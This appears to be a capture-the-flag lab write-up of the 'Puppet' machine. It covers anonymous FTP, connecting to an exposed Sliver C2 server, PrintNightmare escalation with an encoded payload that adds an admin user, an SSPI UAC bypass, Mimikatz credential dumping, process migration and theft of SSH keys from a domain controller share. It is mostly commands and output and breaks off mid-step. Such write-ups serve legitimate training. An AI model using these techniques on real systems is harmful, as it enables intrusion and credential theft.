@@ -1,0 +1,739 @@
+Active Recon
+Linux Host Puppet:
+
+The initial reconnaissance focused on identifying services and potential vulnerabilities on the Linux host, which was suspected to be the C2 server based on the scenario description.
+
+To begin, an Nmap (Network Mapper) scan was performed against the IP address 10.10.155.231. Nmap is a powerful open-source tool for network discovery and security auditing. The -sV flag was used for version detection of services, -Pn to skip host discovery (assuming the host is up), and -ST for a full TCP connect scan, which is generally reliable
+
+┌──(toothless5143@kali)-[~]
+└─$ nmap -sV -Pn 10.10.155.231 -sT 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 17:20 +06
+Nmap scan report for 10.10.155.231
+Host is up (0.19s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE SERVICE        VERSION
+21/tcp    open  ftp            vsftpd 3.0.5
+22/tcp    open  ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+8443/tcp  open  ssl/https-alt?
+31337/tcp open  ssl/Elite?
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+The Nmap scan results were crucial, revealing several open TCP ports:
+
+21/tcp: FTP (File Transfer Protocol), running vsftpd version 3.0.5. FTP is often a target due to misconfigurations like anonymous access or weak credentials.
+22/tcp: SSH (Secure Shell), running OpenSSH 8.9p1 Ubuntu. SSH is a secure way to access a remote shell, but can be vulnerable if weak credentials or outdated versions are used.
+8443/tcp: ssl/https-alt? This port is commonly used for HTTPS services, often application-specific web interfaces, and indicated a web server or application listening.
+31337/tcp: ssl/Elite? The “Elite” service name is often a placeholder or a custom service. Given the context of a C2 framework, this port was highly suspicious as a potential C2 listener. The service information also confirmed the operating system as Linux, with CPE (Common Platform Enumeration) cpe:/o:linux:linux_kernel.
+Vulnerability Analysis & Exploitation
+The presence of an FTP server (vsftpd 3.0.5) on port 21 prompted an immediate check for anonymous access, a common misconfiguration. The standard ftp client was used to connect.
+
+┌──(toothless5143@kali)-[~]
+└─$ ftp 10.10.155.231
+Connected to 10.10.155.231.
+220 (vsFTPd 3.0.5)
+Name (10.10.155.231:toothless5143): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+When prompted for Name, anonymous was entered. For the Password, an empty password (just pressing Enter) was provided. The server responded with "230 Login successful," indicating anonymous FTP access was permitted.
+
+Once connected, the ls command was used to list files in the current directory on the FTP server.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||24965|)
+150 Here comes the directory listing.
+-rw----r--    1 0        0            2119 Oct 11  2024 red_127.0.0.1.cfg
+-rwxr-xr-x    1 0        0        36515304 Oct 12  2024 sliver-client_linux
+226 Directory send OK.
+This listing revealed two files of significant interest: red_127.0.0.1.cfg and sliver-client_linux. The .cfg extension suggested a configuration file, and the name "sliver-client_linux" strongly implied it was a Linux client binary for the Sliver C2 framework. Both files were downloaded to the attacker's machine using the get command.
+
+ftp> get red_127.0.0.1.cfg
+local: red_127.0.0.1.cfg remote: red_127.0.0.1.cfg
+229 Entering Extended Passive Mode (|||13413|)
+150 Opening BINARY mode data connection for red_127.0.0.1.cfg (2119 bytes).
+100% |*****************************************************************************************************************|  2119       46.99 MiB/s    00:00 ETA
+226 Transfer complete.
+2119 bytes received in 00:00 (11.87 KiB/s)
+
+ftp> get sliver-client_linux
+local: sliver-client_linux remote: sliver-client_linux
+229 Entering Extended Passive Mode (|||64971|)
+150 Opening BINARY mode data connection for sliver-client_linux (36515304 bytes).
+100% |*****************************************************************************************************************| 35659 KiB  675.32 KiB/s    00:00 ETA
+226 Transfer complete.
+36515304 bytes received in 00:52 (673.09 KiB/s)
+The downloaded configuration file, red_127.0.0.1.cfg, was then examined.
+
+┌──(toothless5143@kali)-[~]
+└─$ cat red_127.0.0.1.cfg 
+{"operator":"red","token":"bfbb238704ffecea42314144f4304fb67ffa216006c326fbee7318000e6b5542","lhost":"127.0.0.1","lport":31337,
+Its content confirmed it was indeed a Sliver client configuration file. The JSON structure included "lhost":"127.0.0.1" and "lport":31337. This meant that the Sliver C2 server on the puppet machine was configured to listen for client connections on its local loopback interface (127.0.0.1) at port 31337. This also implied that an existing implant (beacon) on another machine (file01) was trying to connect back to 10.10.155.231:31337, but the C2 server component itself was only directly accessible from the puppet machine.
+
+To enable the attacker’s sliver-client_linux to connect to this C2 server, the traffic needed to be relayed from the attacker's machine to the puppet server's localhost port. socat (Socket CAT) is a versatile utility for relaying data between two points. It was used on the attacker's Kali machine to create a TCP listener on port 31337. Any connection to this local port would then be forwarded to 10.10.155.231:31337. The reuseaddr option allows immediate reuse of the port, and fork allows socat to handle multiple connections.
+
+┌──(toothless5143@kali)-[~]
+└─$ sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.10.155.231:31337
+With this port forwarding in place, the downloaded sliver-client_linux binary was made executable (chmod +x sliver-client_linux). The downloaded configuration file (red_127.0.0.1.cfg) was then imported into the Sliver client. This tells the client how to connect to the C2 server.
+
+┌──(toothless5143@kali)-[~]
+└─$ ./sliver-client_linux import red_127.0.0.1.cfg 
+2025/05/13 17:50:24 Saved new client config to: /home/toothless5143/.sliver-client/configs/red_127.0.0.1.cfg
+Finally, the Sliver client was executed. It automatically attempted to connect to 127.0.0.1:31337, which, due to the socat tunnel, was effectively connecting to the C2 server on the puppet machine.
+
+┌──(toothless5143@kali)-[~]
+└─$ ./sliver-client_linux                           
+Connecting to 127.0.0.1:31337 ...
+
+          ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
+        ▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
+        ░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
+          ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
+        ▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
+        ▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
+        ░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
+        ░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
+                  ░      ░  ░ ░        ░     ░  ░   ░
+
+All hackers gain renown
+[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
+[*] Welcome to the sliver shell, please type 'help' for options
+
+[*] Check for updates with the 'update' command
+
+sliver >  
+A successful connection was established to the Sliver C2 server. Inside the Sliver console, the beacons command was issued. This command lists all active implants (beacons) that are currently communicating with the C2 server.
+
+sliver > beacons
+
+ ID         Name          Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In 
+========== ============= =========== ========== ==================== ================== =============== ===============
+ 8ed5ce87   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith   windows/amd64      23s             8s
+Windows Host File01:
+
+The beacons command revealed one active beacon with ID 8ed5ce87. It was named puppet-mtls (indicating an mTLS transport mechanism), originating from the hostname File01, and running under the user context PUPPET\Bruce.Smith. This marked the initial foothold into the Windows segment of the network, leveraging the pre-existing implant.
+
+sliver > use 8ed5ce87
+
+[*] Active beacon puppet-mtls (8ed5ce87-53cc-4578-81cd-ed478643f71c)
+Having gained initial low-privilege access to file01 as PUPPET\Bruce.Smith via the Sliver beacon, the next objective was to escalate privileges to a more powerful account, ideally SYSTEM, on this Windows host.
+
+First, an interactive session needed to be established with the active beacon. The use 8ed5ce87 command selected the beacon, and then interactive was issued to request an interactive shell session.
+
+sliver (puppet-mtls) > interactive
+
+[*] Using beacon's active C2 endpoint: mtls://pm01.puppet.vl:8443
+[*] Tasked beacon puppet-mtls (4efd5c1e)
+
+[*] Session 7da3951b puppet-mtls - 10.10.155.230:55167 (File01) - windows/amd64 - Tue, 13 May 2025 18:02:28 +06
+
+sliver (puppet-mtls) > use 7da3951b
+
+[*] Active session puppet-mtls (7da3951b-84c8-4d00-a00b-a8c16504f73e)
+This action tasked the beacon to establish a more stable, interactive C2 channel, resulting in a new session ID, 7da3951b. Within this new interactive session, the ps command (Sliver's process listing) was used to examine running processes. The output showed puppet-update.exe with PID 2100, running as PUPPET\Bruce.Smith. This confirmed puppet-update.exe was the Sliver agent process.
+
+sliver (puppet-mtls) > ps
+
+ Pid    Ppid   Owner                Arch     Executable                    Session 
+====== ====== ==================== ======== ============================= =========
+ 0      0                                    [System Process]              -1      
+ 2100   2548   PUPPET\Bruce.Smith   x86_64   puppet-update.exe             1
+To further understand the system, directory navigation was performed.
+
+sliver (puppet-mtls) > cd c:\\programdata
+
+[*] c:\programdata
+
+sliver (puppet-mtls) > ls
+
+c:\programdata (17 items, 4.6 KiB)
+==================================
+drwxrwxrwx  Amazon                                                     <dir>    Sat Oct 12 08:59:44 -0700 2024
+<SNIP>
+drwxrwxrwx  Puppet                                                     <dir>    Sat Oct 12 04:42:37 -0700 2024
+drwxrwxrwx  PuppetLabs    
+</SNIP>
+Listing the contents of c:\programdata revealed a directory named Puppet, indicating that Puppet agent software was installed on file01. The double backslashes (\\) are necessary in some shell environments to escape the single backslash.
+
+To enhance Sliver’s capabilities for privilege escalation and post-exploitation, the armory command was used. The armory is Sliver's repository of extensions and aliases. armory install all downloads and installs all available modules.
+
+sliver (puppet-mtls) > armory install all
+
+? Install 22 aliases and 151 extensions? Yes
+Prior to achieving SYSTEM, SharpHound had been executed. SharpHound is the official data collector for BloodHound, a tool used to visualize Active Directory attack paths. It gathers information about users, groups, computers, sessions, ACLs, etc. While initially, no clear attack path was found with the Bruce.Smith context, the collected data could be useful later.
+
+sliver (puppet-mtls) > execute-assembly /home/toothless5143/tools/win-shareables/SharpCollection/NetFramework_4.7_x86/SharpHound.exe -s -c all
+
+[*] Output:
+2025-05-13T06:56:27.9845623-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-05-13T06:56:28.0314581-07:00|INFORMATION|Initializing SharpHound at 6:56 AM on 5/13/2025
+2025-05-13T06:56:28.5025711-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for puppet.vl : DC01.puppet.vl
+2025-05-13T06:56:28.6570582-07:00|INFORMATION|[SearchForest] Cross-domain enumeration may result in reduced data quality
+2025-05-13T06:56:29.0480061-07:00|INFORMATION|Domains for enumeration: ["puppet.vl"]
+2025-05-13T06:56:29.0552543-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-05-13T06:56:29.3448366-07:00|INFORMATION|Beginning LDAP search for puppet.vl
+2025-05-13T06:56:29.4077644-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2025-05-13T06:56:29.4233822-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2025-05-13T06:57:00.2142141-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 41 MB RAM
+2025-05-13T06:57:26.4372606-07:00|INFORMATION|Consumers finished, closing output channel
+2025-05-13T06:57:26.5157952-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+Closing writers
+2025-05-13T06:57:26.6569256-07:00|INFORMATION|Status: 126 objects finished (+126 2.210526)/s -- Using 48 MB RAM
+2025-05-13T06:57:26.6726371-07:00|INFORMATION|Enumeration finished in 00:00:57.3360565
+2025-05-13T06:57:26.8292942-07:00|INFORMATION|Saving cache with stats: 85 ID to type mappings.
+ 87 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-05-13T06:57:26.8610860-07:00|INFORMATION|SharpHound Enumeration Completed at 6:57 AM on 5/13/2025! Happy Graphing!
+For Windows privilege escalation enumeration, PrivescCheck.ps1 is a popular PowerShell script that checks for common misconfigurations. This script was uploaded from the attacker's machine to the c:\temp directory on file01 using Sliver's upload command.
+
+sliver (puppet-mtls) > cd c:\\temp
+
+[*] c:\temp
+
+sliver (puppet-mtls) > upload /home/toothless5143/tools/win-shareables/priv-esc/PrivescCheck.ps1
+
+[*] Wrote file to C:\temp\PrivescCheck.ps1
+Once uploaded, PrivescCheck.ps1 was executed on file01 via Sliver's sharpsh module. sharpsh allows running arbitrary PowerShell commands or scripts through the beacon. The -t 1000 sets a timeout, -c specifies the command to run, and -u indicates the script to use for user-defined functions.
+
+sliver (puppet-mtls) > sharpsh -t 1000 -- -c Invoke-PrivescCheck -u PrivescCheck.ps1
+
+Policy      : Limits print driver installation to Administrators
+Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
+Value       : RestrictDriverInstallationToAdministrators
+Data        : 0
+Default     : 1
+Expected    : <null|1>
+Description : Installing printer drivers does not require administrator privileges.
+
+Policy      : Point and Print Restrictions > NoWarningNoElevationOnInstall
+Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
+Value       : NoWarningNoElevationOnInstall
+Data        : 1
+Default     : 0
+Expected    : <null|0>
+Description : Do not show warning or elevation prompt. Note: this setting reintroduces the PrintNightmare LPE 
+              vulnerability, even if the settings 'InForest' and/or 'TrustedServers' are configured.
+The output from PrivescCheck.ps1 was critical. It identified that the system was vulnerable to PrintNightmare (CVE-2021-34527).
+
+PrintNightmare is a vulnerability in the Windows Print Spooler service. When specific registry keys are misconfigured (like RestrictDriverInstallationToAdministrators being set to 0, allowing non-admins to install printer drivers, or NoWarningNoElevationOnInstall set to 1, suppressing prompts), an attacker can install a malicious printer driver. This allows for arbitrary code execution, often with SYSTEM privileges if the Spooler service is running as SYSTEM (which it typically does). The PrivescCheck output confirmed these vulnerable configurations were present on file01.
+
+A proof-of-concept (PoC) exploit script for CVE-2021–34527, available at https://github.com/JohnHammond/CVE-2021-34527, was chosen. A PowerShell payload was crafted to be executed by the exploit. This payload aimed to create a new local user named Toothless5143 with the password Password123 and add this user to the local Administrators group. The command was: Invoke-Nightmare -DriverName "Xerox3010" -NewUser "Toothless5143" -NewPassword "Password123". This PowerShell command was then Base64 encoded, as often required by PowerShell execution contexts. The PoC script (CVE-2021-34527.ps1) was uploaded to file01.
+
+sliver (puppet-mtls) > upload /home/toothless5143/CVE-2021-34527.ps1
+
+[*] Wrote file to C:\temp\CVE-2021-34527.ps1
+The PrintNightmare exploit was then executed using sharpsh, with -i for interactive mode, -s for system context, -u to specify the exploit script, and -e to provide the Base64-encoded payload.
+
+sliver (puppet-mtls) > sharpsh -i -s -t 1000 -- -u CVE-2021-34527.ps1 -e -c SQBuAHYAbwBrAGUALQBOAGkAZwBoAHQAbQBhAHIAZQAgAC0ARAByAGkAdgBlAHIATgBhAG0AZQAgACIAWABlAHIAbwB4ADMAMAAxADAAIgAgAC0ATgBlAHcAVQBzAGUAcgAgACIAVABvAG8AdABoAGwAZQBzAHMANQAxADQAMwAiACAALQBOAGUAdwBQAGEAcwBzAHcAbwByAGQAIAAiAFAAYQBzAHMAdwBvAHIAZAAxADIAMwAiAA==
+
+? Do you want to continue? Yes
+The exploit successfully created the Toothless5143 user and added them to the local Administrators group. The newly set credentials were tested by launching the notepad.exe using the runas command.
+
+sliver (puppet-mtls) > runas -u Toothless5143 -P "Password123" -p notepad.exe
+
+[*] Successfully ran notepad.exe  on puppet-mtls
+To gain a beacon with these new, higher privileges, the Sliver agent (puppet-update.exe) was re-executed on File01 using the runas command, specifying the new credentials. The -p flag indicates the program to run.
+
+sliver (puppet-mtls) > runas -u Toothless5143 -P "Password123" -p C:\\programdata\\puppet\\puppet-update.exe
+
+[*] Successfully ran C:\programdata\puppet\puppet-update.exe  on puppet-mtls
+
+[*] Beacon 278d83f2 puppet-mtls - 10.10.211.182:58427 (File01) - windows/amd64 - Wed, 14 May 2025 14:30:24 +06
+This action resulted in a new beacon appearing in Sliver, ID 278d83f2. However, when checking the beacons list, the username for this new beacon was displayed as <err>. This often indicates that User Account Control (UAC) is preventing the process from running with its full administrative token, even though the user is a member of the Administrators group.
+
+sliver (puppet-mtls) > beacons
+
+ ID         Name          Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In 
+========== ============= =========== ========== ==================== ================== =============== ===============
+ d0e98f58   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith   windows/amd64      14s             17s           
+ 7a604e89   puppet-mtls   mtls        File01     <err>                windows/amd64      17s             13s
+Switching to this new beacon (use 278d83f2) and running sa-whoami (a Sliver alias for whoami executed as a COFF object) confirmed that the user was FILE01\Toothless5143, but the process was running at a medium integrity level, not high (elevated).
+
+sliver (puppet-mtls) > use 278d83f2
+
+[*] Active beacon puppet-mtls (278d83f2-bdeb-4929-b448-eb54b22d490d)
+
+sliver (puppet-mtls) > sa-whoami
+
+[*] Tasked beacon puppet-mtls (b5989000)
+
+[+] puppet-mtls completed task b5989000
+
+[*] Successfully executed sa-whoami (coff-loader)
+[*] Got output:
+
+UserName                SID
+====================== ====================================
+FILE01\Toothless5143    S-1-5-21-2946821189-2073930159-359736154-1000
+
+
+GROUP INFORMATION                                 Type                     SID                                          Attributes               
+================================================= ===================== ============================================= ==================================================
+FILE01\None                                       Group                    S-1-5-21-2946821189-2073930159-359736154-513  Mandatory group, Enabled by default, Enabled group, 
+Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114                                     
+BUILTIN\Administrators                            Alias                    S-1-5-32-544                                  
+BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group, 
+CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group, 
+LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group, 
+NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group, 
+Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group, 
+
+
+Privilege Name                Description                                       State                         
+============================= ================================================= ===========================
+SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       
+SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
+To bypass UAC and obtain a high-integrity process, the UAC-BOF-Bonanza extension (https://github.com/icyguider/UAC-BOF-Bonanza) was utilized. This collection includes various UAC bypass techniques implemented as Beacon Object Files (BOFs). The SspiUacBypass tool from this repository was cloned to the attacker's machine and compiled using the provided Makefile.
+
+┌──(toothless5143@kali)-[~/tools/win-shareables]
+└─$ git clone https://github.com/icyguider/UAC-BOF-Bonanza
+Cloning into 'UAC-BOF-Bonanza'...
+remote: Enumerating objects: 70, done.
+remote: Counting objects: 100% (70/70), done.
+remote: Compressing objects: 100% (54/54), done.
+remote: Total 70 (delta 17), reused 61 (delta 15), pack-reused 0 (from 0)
+Receiving objects: 100% (70/70), 137.66 KiB | 150.00 KiB/s, done.
+Resolving deltas: 100% (17/17), done.
+
+┌──(toothless5143@kali)-[~/tools/win-shareables]
+└─$ cd UAC-BOF-Bonanza 
+
+┌──(toothless5143@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza/SspiUacBypass]
+└─$ make        
+mkdir -p bin
+mkdir -p bin/standalone
+x86_64-w64-mingw32-g++ -c src/SspiUacBypassBOF.cpp -w -o bin/SspiUacBypassBOF.o
+x86_64-w64-mingw32-g++ src/standalone/SspiUacBypass.cpp src/standalone/CreateSvcRpc.cpp -static -lsecur32 -s -w -o bin/standalone/SspiUacBypass.exe
+The compiled SspiUacBypass extension (a directory containing the BOF and its definition) was then copied into the Sliver client's local extensions directory (~/.sliver-client/extensions/).
+
+┌──(toothless5143@kali)-[~/tools/win-shareables/UAC-BOF-Bonanza]
+└─$ cp -r SspiUacBypass ~/.sliver-client/extensions/
+Back in the Sliver console (still in the 278d83f2 medium-integrity beacon context), the new extension was loaded.
+
+sliver (puppet-mtls) > extensions load /home/toothless5143/tools/win-shareables/UAC-BOF-Bonanza/SspiUacBypass
+
+[*] Added SspiUacBypass command: Perform UAC bypass via SSPI Datagram Contexts
+This made the SspiUacBypass command available. This command was then executed, targeting the puppet-update.exe agent. The bypass technique works by manipulating SSPI (Security Support Provider Interface) contexts to create a new process with an elevated token.
+
+sliver (puppet-mtls) > SspiUacBypass C:\\programdata\\puppet\\puppet-update.exe
+
+[*] Tasked beacon puppet-mtls (c4d8392f)
+
+[+] puppet-mtls completed task c4d8392f
+
+[*] Successfully executed SspiUacBypass (coff-loader)
+[*] Got output:
+
+        SspiUacBypass - Bypassing UAC with SSPI Datagram Contexts
+        by @splinter_code
+
+Forging a token from a fake Network Authentication through Datagram Contexts
+Network Authentication token forged correctly, handle --> 0x2c0
+Forged Token Session ID set to 1. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session 
+Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now
+Invoking CreateSvcRpc (by @x86matthew)
+Connecting to \\127.0.0.1\pipe\ntsvcs RPC pipe 
+Opening service manager...
+Creating temporary service...
+Executing 'C:\programdata\puppet\puppet-update.exe' as SYSTEM user...
+Deleting temporary service...
+Finished
+
+
+[*] Beacon 18bdeee4 puppet-mtls - 10.10.211.182:59947 (File01) - windows/amd64 - Wed, 14 May 2025 15:52:28 +06
+The UAC bypass was successful. A new beacon, 18bdeee4, appeared in Sliver. Checking its details confirmed it was running with the full privileges of NT AUTHORITY\SYSTEM on File01.
+
+sliver (puppet-mtls) > beacons
+
+ ID         Name          Transport   Hostname   Username              Operating System   Last Check-In   Next Check-In 
+========== ============= =========== ========== ===================== ================== =============== ===============
+ 255c1696   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith    windows/amd64      8s              24s           
+ 278d83f2   puppet-mtls   mtls        File01     <err>                 windows/amd64      30s             1s            
+ 18bdeee4   puppet-mtls   mtls        File01     NT AUTHORITY\SYSTEM   windows/amd64      29s             3s
+Post Exploitation
+Now, operating with the SYSTEM beacon (18bdeee4), Mimikatz was executed. Mimikatz is a powerful post-exploitation tool capable of extracting plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory, specifically from the LSASS (Local Security Authority Subsystem Service) process. The token::elevate command attempts to impersonate a privileged token, privilege::debug grants necessary debug privileges, and sekurlsa::logonpasswords dumps credentials.
+
+sliver (puppet-mtls) > mimikatz "token::elevate privilege::debug sekurlsa::logonpasswords exit"
+
+Authentication Id : 0 ; 666026 (00000000:000a29aa)
+Session           : Service from 0
+User Name         : svc_puppet_win_t1
+Domain            : PUPPET
+Logon Server      : DC01
+Logon Time        : 5/13/2025 10:30:18 PM
+SID               : S-1-5-21-3066630505-2324057459-3046381011-1131
+        msv :
+         [00000003] Primary
+         * Username : svc_puppet_win_t1
+         * Domain   : PUPPET
+         * NTLM     : <REDACTED>
+         * SHA1     : e4b6c57180670c42d1894db1daebe833787ad23b
+         * DPAPI    : abe71d756f0b2d9e69b803833ef4869d
+The Mimikatz output was invaluable, revealing credentials for several accounts. Most notably, the NTLM hash for a service account named svc_puppet_win_t1 was found. This hash would be crucial for lateral movement.
+
+An attempt was made to list SMB shares on the Domain Controller (dc01) using the sa-netshares dc01 Sliver alias and then to list the contents of a share named it (ls \\\\dc01.puppet.vl\\it). These attempts failed, indicating that the default SYSTEM token of file01 did not have permissions to access shares on dc01. This is typical as machine accounts usually have limited cross-machine access unless explicitly granted.
+
+sliver (puppet-mtls) > sa-netshares dc01
+
+[*] Successfully executed sa-netshares (coff-loader)
+[*] Got output:
+Share: 
+---------------------dc01----------------------------------
+ADMIN$
+C$
+IPC$
+it
+NETLOGON
+SYSVOL
+
+
+sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it
+
+
+\\dc01.puppet.vl\it\ (0 items, 0 B)
+===================================
+(ACCESS DENIED)
+Lateral Movement
+The hypothesis was that svc_puppet_win_t1, being a service account potentially related to Puppet, might possess permissions on other Puppet-managed systems, including dc01. Instead of performing a Pass-the-Hash (PTH) attack with the NTLM hash (which involves using the hash directly for authentication and can be noisy or detected), process injection was chosen as a more stealthy method to operate under the context of svc_puppet_win_t1.
+
+First, services running on file01 were queried to identify the process associated with svc_puppet_win_t1. The sa-sc-query Sliver alias (querying service configuration) was used.
+
+sliver (puppet-mtls) > sa-sc-enum
+
+<SNIP>
+SERVICE_NAME: puppet
+DISPLAY_NAME: Puppet Agent
+        TYPE                           : 16 WIN32_OWN
+        STATE                          : 4 RUNNING
+        WIN32_EXIT_CODE                : 0
+        SERVICE_EXIT_CODE              : 0
+        CHECKPOINT                     : 0
+        WAIT_HINT                      : 0
+        PID                            : 1552
+        FLAGS                          : 0
+        TYPE                           : 10 WIN32_OWN
+        START_TYPE                     : 2 AUTO_START
+        ERROR_CONTROL                  : 1 NORMAL
+        BINARY_PATH_NAME               : "C:\Program Files\Puppet Labs\Puppet\sys\ruby\bin\ruby.exe" -rubygems "C:\Program Files\Puppet Labs\Puppet\service\daemon.rb"
+        LOAD_ORDER_GROUP               : 
+        TAG                            : 0
+        DISPLAY_NAME                   : Puppet Agent
+        DEPENDENCIES                   : 
+        SERVICE_START_NAME             : svc_puppet_win_t1@puppet.vl
+        RESET_PERIOD (in seconds)      : 0
+        REBOOT_MESSAGE                 : 
+        COMMAND_LINE                   : 
+        FAILURE_ACTIONS                : RESTART -- Delay = 60000 milliseconds
+        FAILURE_ACTIONS                : RESTART -- Delay = 60000 milliseconds
+        FAILURE_ACTIONS                : RESTART -- Delay = 60000 milliseconds
+The service has not registered for any start or stop triggers.
+</SNIP>
+
+
+sliver (puppet-mtls) > sa-sc-query FILE01 puppet
+
+[*] Successfully executed sa-sc-query (coff-loader)
+[*] Got output:
+SERVICE_NAME: puppet
+        TYPE                 : 16 WIN32_OWN
+        STATE                : 4 RUNNING
+        WIN32_EXIT_CODE      : 0
+        SERVICE_EXIT_CODE    : 0
+        CHECKPOINT           : 0
+        WAIT_HINT            : 0
+        PID                  : 1552
+        Flags                : 0
+The output showed that the puppet (Puppet Agent) service was running, its SERVICE_START_NAME was svc_puppet_win_t1@puppet.vl, and its Process ID (PID) was 1552. This meant that process 1552 was running under the desired user context.
+
+The current SYSTEM beacon (18bdeee4) was then migrated into the Puppet Agent process (PID 1552). Sliver's migrate command injects the beacon's shellcode into a target process and resumes execution there, effectively taking on the identity and privileges of the target process.
+
+sliver (puppet-mtls) > migrate -p 1552
+
+[*] Successfully migrated to 1552
+
+[*] Beacon 5fd6f893 puppet-mtls - 10.10.217.54:54107 (File01) - windows/amd64 - Thu, 15 May 2025 12:32:10 +06
+This migration was successful, yielding a new beacon, 5fd6f893. This new beacon was now operating with the permissions of PUPPET\svc_puppet_win_t1. With this impersonated context, the previous attempt to access the SMB share on dc01 was retried.
+
+sliver (puppet-mtls) > use 5fd6f893
+
+[*] Active beacon puppet-mtls (5fd6f893-8722-4e90-ac90-09cf4ac4c5f7)
+This time, the command succeeded, listing the contents of the \\dc01.puppet.vl\it share. Within this share, a directory named .ssh was discovered. This is a standard directory name for storing SSH keys on Unix-like systems.
+
+sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it
+
+[*] Tasked beacon puppet-mtls (fcb3d29b)
+
+[+] puppet-mtls completed task fcb3d29b
+
+\\dc01.puppet.vl\it\ (3 items, 813.9 KiB)
+=========================================
+drwxrwxrwx  .ssh          <dir>      Sat Oct 12 01:39:50 -0700 2024
+drwxrwxrwx  firewalls     <dir>      Sat Oct 12 01:15:05 -0700 2024
+-rw-rw-rw-  PsExec64.exe  813.9 KiB  Sat Oct 12 01:07:00 -0700 2024
+Listing the contents of the .ssh directory (ls \\\\dc01.puppet.vl\\it\\.ssh) revealed an ed25519 private SSH key and its corresponding ed25519.pub public key. These were immediately downloaded to the attacker's machine using Sliver's download command.
+
+sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it\\.ssh
+
+\\dc01.puppet.vl\it\.ssh (2 items, 580 B)
+=========================================
+-rw-rw-rw-  ed25519      472 B  Sat Oct 12 01:14:23 -0700 2024
+-rw-rw-rw-  ed25519.pub  108 B  Sat Oct 12 01:40:09 -0700 2024
+
+sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it\\.ssh
+
+\\dc01.puppet.vl\it\.ssh (2 items, 580 B)
+=========================================
+-rw-rw-rw-  ed25519      472 B  Sat Oct 12 01:14:23 -0700 2024
+-rw-rw-rw-  ed25519.pub  108 B  Sat Oct 12 01:40:09 -0700 2024
+
+sliver (puppet-mtls) > download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519
+
+[*] Wrote 472 bytes (1 file successfully, 0 files unsuccessfully) to /home/toothless5143/puppet/\\dc01.puppet.vl\it\.ssh\ed25519
+
+sliver (puppet-mtls) > download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519.pub
+
+[*] Wrote 108 bytes (1 file successfully, 0 files unsuccessfully) to /home/toothless5143/puppet/\\dc01.puppet.vl\it\.ssh\ed25519.pub
+Inspection of the ed25519.pub file content (cat ed25519.pub on the attacker machine) showed a comment at the end: svc_puppet_lin_t1@puppet.vl. This strongly indicated that the private key was intended for the user svc_puppet_lin_t1 to SSH into the Linux server named puppet.vl (our puppet machine).
+
+┌──(toothless5143@kali)-[~]
+└─$ cat ed25519.pub
